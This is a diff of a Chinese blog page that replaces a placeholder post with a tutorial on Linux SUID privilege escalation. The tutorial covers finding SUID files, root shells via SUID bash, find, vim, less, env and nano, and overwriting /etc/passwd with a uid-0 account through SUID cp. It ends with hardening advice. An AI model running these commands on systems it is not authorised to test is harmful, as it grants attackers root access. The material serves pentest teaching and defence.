@@ -193,7 +193,7 @@
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2025/09/14/%E6%B5%8B%E8%AF%95/" class="post-title-link" itemprop="url">测试</a>
+          <a href="/2025/09/14/%E6%B5%8B%E8%AF%95/" class="post-title-link" itemprop="url">suid提权</a>
         </h2>
 
         <div class="post-meta-container">
@@ -203,9 +203,15 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
-      
 
-      <time title="创建时间：2025-09-14 18:08:28 / 修改时间：18:10:48" itemprop="dateCreated datePublished" datetime="2025-09-14T18:08:28+08:00">2025-09-14</time>
+      <time title="创建时间：2025-09-14 18:08:28" itemprop="dateCreated datePublished" datetime="2025-09-14T18:08:28+08:00">2025-09-14</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2025-09-15 00:00:52" itemprop="dateModified" datetime="2025-09-15T00:00:52+08:00">2025-09-15</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -213,7 +219,7 @@
       </span>
       <span class="post-meta-item-text">分类于</span>
         <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E5%89%8D%E7%AB%AF/" itemprop="url" rel="index"><span itemprop="name">前端</span></a>
+          <a href="/categories/%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">渗透</span></a>
         </span>
     </span>
 
@@ -227,7 +233,92 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h1 id="The-first-article"><a href="#The-first-article" class="headerlink" title="The first article"></a>The first article</h1>
+          <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"># Linux SUID 提权详解：原理、发现与利用</span><br><span class="line"></span><br><span class="line">## 什么是 SUID？</span><br><span class="line"></span><br><span class="line">SUID (Set User ID) 是 Linux 和 Unix 系统的一种特殊文件权限。它允许用户以**文件所有者的权限**来执行该文件，而不是以当前用户的权限。</span><br><span class="line"></span><br><span class="line">这是一种非常重要的功能，它允许普通用户临时获得更高权限来完成某些特定的任务。一个最经典的例子就是 `passwd` 命令。</span><br><span class="line"></span><br><span class="line">### 一个简单的例子：`/usr/bin/passwd`</span><br><span class="line"></span><br><span class="line">*   **文件所有者：** `root`</span><br><span class="line">*   **普通用户：** `alice`</span><br><span class="line">*   **正常情况：** `alice` 无法修改 `/etc/shadow` 文件（该文件存储用户密码哈希，只有 root 可读写）。</span><br><span class="line">*   **SUID 的作用：** `/usr/bin/passwd` 命令设置了 SUID 位，并且它的所有者是 `root`。当 `alice` 执行 `passwd` 命令时，这个进程会暂时以 `root` 权限运行，因此它可以成功地写入 `/etc/shadow` 文件来更改 `alice` 自己的密码。</span><br><span class="line"></span><br><span class="line">## 如何识别 SUID 文件？</span><br><span class="line"></span><br><span class="line">SUID 权限在文件权限位上用一个 `s` 来表示，它取代了通常的 `x`（执行）权限。</span><br><span class="line"></span><br><span class="line">### 通过 `ls -l` 查看</span><br><span class="line"></span><br><span class="line">查看 `/usr/bin/passwd` 的权限：</span><br><span class="line"></span><br><span class="line">```bash</span><br><span class="line">ls -l /usr/bin/passwd</span><br></pre></td></tr></table></figure>
+
+<p>输出结果：<br><code>-rwsr-xr-x 1 root root 63960 Feb  7  2020 /usr/bin/passwd</code></p>
+<p>注意所有者权限位中的 <code>rws</code>，这里的 <code>s</code> 就表示该文件设置了 SUID 位。</p>
+<h3 id="查找系统中的-SUID-文件"><a href="#查找系统中的-SUID-文件" class="headerlink" title="查找系统中的 SUID 文件"></a>查找系统中的 SUID 文件</h3><p>在渗透测试或系统安全审计中，寻找所有设置了 SUID 位的文件是发现提权机会的关键第一步。可以使用 <code>find</code> 命令来全局查找：</p>
+<p>bash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 查找所有 SUID 文件</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line"># 解释：</span><br><span class="line"># /              : 从根目录开始搜索</span><br><span class="line"># -perm -u=s     : 查找权限模式包含“设置用户ID (SUID)”的文件</span><br><span class="line"># -type f        : 只查找普通文件</span><br><span class="line"># 2&gt;/dev/null    : 将错误信息（如权限不足）重定向到空设备，使输出更清晰</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="为什么-SUID-会成为安全隐患？"><a href="#为什么-SUID-会成为安全隐患？" class="headerlink" title="为什么 SUID 会成为安全隐患？"></a>为什么 SUID 会成为安全隐患？</h2><p>SUID 的设计初衷是好的，但如果一个本身具有高权限（如 root）且本不应被普通用户随意使用的程序被设置了 SUID 位，那么它就可能成为攻击者提升权限的跳板。</p>
+<p>常见的风险场景包括：</p>
+<ol>
+<li><strong>管理员错误配置：</strong> 给一个普通程序（如 <code>vim</code>, <code>nano</code>, <code>bash</code>）设置了 SUID 位。</li>
+<li><strong>程序本身存在漏洞：</strong> 即使程序本身设计是合理的（如 <code>passwd</code>），如果程序中存在缓冲区溢出、命令注入等漏洞，攻击者也可能利用其高权限执行任意代码。</li>
+<li><strong>功能滥用：</strong> 某些具有 SUID 权限的程序（如 <code>find</code>, <code>cp</code>, <code>env</code>）可以通过巧妙的参数配置来执行命令或覆盖敏感文件，从而被滥用。</li>
+</ol>
+<h2 id="常见的-SUID-提权方法"><a href="#常见的-SUID-提权方法" class="headerlink" title="常见的 SUID 提权方法"></a>常见的 SUID 提权方法</h2><h3 id="1-已知可提权的-SUID-程序"><a href="#1-已知可提权的-SUID-程序" class="headerlink" title="1. 已知可提权的 SUID 程序"></a>1. 已知可提权的 SUID 程序</h3><p>一些程序如果配置了 SUID，很容易被直接用来提权。</p>
+<h4 id="bash-sh-zsh-等-Shell"><a href="#bash-sh-zsh-等-Shell" class="headerlink" title="bash &#x2F; sh &#x2F; zsh 等 Shell"></a><code>bash</code> &#x2F; <code>sh</code> &#x2F; <code>zsh</code> 等 Shell</h4><p>如果 Shell 解释器本身具有 SUID 权限，可以直接获取一个高权限的 shell。</p>
+<p>bash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 如果发现 /bin/bash 是 SUID root</span><br><span class="line">ls -l /bin/bash</span><br><span class="line"># -rwsr-sr-x 1 root root 1234376 Mar 27  2022 /bin/bash</span><br><span class="line"></span><br><span class="line"># 直接运行它，即可获得一个 root shell</span><br><span class="line">/bin/bash -p # -p 参数用于保留提升的权限</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="find"><a href="#find" class="headerlink" title="find"></a><code>find</code></h4><p><code>find</code> 命令功能强大，其中的 <code>-exec</code> 参数可以执行命令。</p>
+<p>bash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 利用 find 执行命令</span><br><span class="line">find . -exec /bin/sh -p \; -quit</span><br><span class="line"></span><br><span class="line"># 或者直接获取 shell</span><br><span class="line">find . -exec /bin/bash -p \;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="vim-vi"><a href="#vim-vi" class="headerlink" title="vim &#x2F; vi"></a><code>vim</code> &#x2F; <code>vi</code></h4><p>如果 Vim 具有 SUID 权限，可以在其内部执行系统命令。</p>
+<p>bash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 运行 vim</span><br><span class="line">vim</span><br><span class="line"></span><br><span class="line"># 在 vim 的命令模式下执行：</span><br><span class="line">:set shell=/bin/sh</span><br><span class="line">:shell</span><br><span class="line"># 或者更简单</span><br><span class="line">:! /bin/bash -p</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="less-more"><a href="#less-more" class="headerlink" title="less &#x2F; more"></a><code>less</code> &#x2F; <code>more</code></h4><p>分页阅读器同样可以在其界面中执行命令。</p>
+<p>bash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 运行 less 或 more 查看一个长文件</span><br><span class="line">less /etc/passwd</span><br><span class="line">more /etc/passwd</span><br><span class="line"></span><br><span class="line"># 在阅读界面中，输入：</span><br><span class="line">! /bin/bash -p</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="cp"><a href="#cp" class="headerlink" title="cp"></a><code>cp</code></h4><p>利用 <code>cp</code> 命令覆盖敏感文件，如 <code>/etc/passwd</code> 或 SSH authorized_keys，从而添加新的 root 用户或允许 root 登录。</p>
+<p>bash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 1. 生成一个密码哈希（例如，密码为 &quot;newpass&quot;）</span><br><span class="line">openssl passwd -1 -salt abc newpass</span><br><span class="line"># 输出：$1$abc$TKMIAf4QNo/z7lT6L9xxL.</span><br><span class="line"></span><br><span class="line"># 2. 创建一个新的 passwd 文件行</span><br><span class="line">echo &#x27;newroot:$1$abc$TKMIAf4QNo/z7lT6L9xxL.:0:0:root:/root:/bin/bash&#x27; &gt; /tmp/newpasswd</span><br><span class="line"></span><br><span class="line"># 3. 使用 SUID 的 cp 覆盖原文件</span><br><span class="line">cp /tmp/newpasswd /etc/passwd</span><br><span class="line"></span><br><span class="line"># 4. 切换到 newroot 用户</span><br><span class="line">su newroot</span><br><span class="line"># 输入密码：newpass</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="env"><a href="#env" class="headerlink" title="env"></a><code>env</code></h4><p><code>env</code> 命令可以调用其他程序，绕过路径限制。</p>
+<p>bash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">env /bin/sh -p</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="nano"><a href="#nano" class="headerlink" title="nano"></a><code>nano</code></h4><p>类似于 Vim，Nano 也可以在编辑文件时执行命令。</p>
+<p>bash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nano</span><br><span class="line"># 按 Ctrl + R，然后按 Ctrl + X</span><br><span class="line"># 然后输入：/bin/bash -p</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="2-利用程序漏洞"><a href="#2-利用程序漏洞" class="headerlink" title="2. 利用程序漏洞"></a>2. 利用程序漏洞</h3><p>如果某个 SUID 程序存在漏洞（如缓冲区溢出），则需要编写或利用现有的漏洞利用代码（Exploit）来攻击它，使其执行我们的恶意载荷（Payload），从而获得一个高权限的 shell。这需要一定的逆向工程和漏洞分析能力。</p>
+<p><strong>资源：</strong> 在 <a target="_blank" rel="noopener" href="https://www.exploit-db.com/">Exploit-DB</a> 或 GitHub 上搜索相关程序的漏洞利用代码。</p>
+<h3 id="3-共享对象注入-SO-Injection"><a href="#3-共享对象注入-SO-Injection" class="headerlink" title="3. 共享对象注入 (SO Injection)"></a>3. 共享对象注入 (SO Injection)</h3><p>在某些情况下，SUID 程序在运行时可能会加载我们可控的共享库（<code>.so</code> 文件），从而导致代码执行。可以通过 <code>strace</code> 命令来追踪程序运行时所调用的库文件。</p>
+<h2 id="如何防范-SUID-提权？"><a href="#如何防范-SUID-提权？" class="headerlink" title="如何防范 SUID 提权？"></a>如何防范 SUID 提权？</h2><h3 id="1-原则：最小权限原则"><a href="#1-原则：最小权限原则" class="headerlink" title="1. 原则：最小权限原则"></a>1. 原则：最小权限原则</h3><ul>
+<li>除非绝对必要，否则不要给任何文件设置 SUID 位。</li>
+<li>定期审计系统中的应用，移除不必要的 SUID 权限。</li>
+</ul>
+<h3 id="2-审计和移除不必要的-SUID"><a href="#2-审计和移除不必要的-SUID" class="headerlink" title="2. 审计和移除不必要的 SUID"></a>2. 审计和移除不必要的 SUID</h3><p>使用前面提到的 <code>find</code> 命令查找 SUID 文件，并问自己一个问题：<strong>这个程序真的需要以 root 权限运行吗？</strong></p>
+<p>移除不必要的 SUID 位：</p>
+<p>bash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chmod u-s /path/to/file</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="3-使用其他机制替代"><a href="#3-使用其他机制替代" class="headerlink" title="3. 使用其他机制替代"></a>3. 使用其他机制替代</h3><ul>
+<li>对于需要特权操作的场景，考虑使用 <code>sudo</code> 来更精细地控制命令的执行权限，而不是滥用 SUID。</li>
+<li>使用功能（Capabilities）机制，将 root 的权限分解为一系列独立的能力，只赋予程序所需的最小能力集，而不是完整的 root 权限。例如，赋予 <code>ping</code> 命令 <code>CAP_NET_RAW</code> 能力而不是设置 SUID。</li>
+</ul>
+<p>bash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 移除 ping 的 SUID 位</span><br><span class="line">sudo chmod u-s /bin/ping</span><br><span class="line"># 赋予它 CAP_NET_RAW 能力</span><br><span class="line">sudo setcap cap_net_raw+ep /bin/ping</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="4-保持系统和软件更新"><a href="#4-保持系统和软件更新" class="headerlink" title="4. 保持系统和软件更新"></a>4. 保持系统和软件更新</h3><p>及时更新系统和软件，修补已知的漏洞，防止攻击者利用SUID程序的漏洞进行提权。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>SUID 是一把双刃剑，它既是系统正常运行所必需的功能，也可能成为攻击者提权的入口。理解 SUID 的工作原理，掌握发现和利用 SUID 文件的方法，对于渗透测试者和系统管理员都至关重要。同时，坚守<strong>最小权限原则</strong>，定期审计和加固系统，是防御 SUID 提权攻击最有效的手段。</p>
+
       
     </div>
 
